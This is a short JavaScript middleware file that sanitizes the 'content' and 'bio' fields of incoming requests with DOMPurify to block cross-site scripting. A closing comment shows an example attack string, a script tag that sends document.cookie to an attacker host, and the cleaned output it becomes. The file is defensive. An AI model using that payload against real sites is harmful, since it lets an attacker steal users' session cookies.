import DOMPurify from "isomorphic-dompurify";

export const sanitizeContent = (req, res, next) => {
  if (req.body.content) {
    // Strips <script>, javascript: links, and malicious attributes like onerror=...
    req.body.content = DOMPurify.sanitize(req.body.content);
  }
  if (req.body.bio) {
    req.body.bio = DOMPurify.sanitize(req.body.bio);
  }
  next();
};

// Attack: "<script>fetch('http://attacker.com?c='+document.cookie)</script>Hello"
// Output: "Hello"
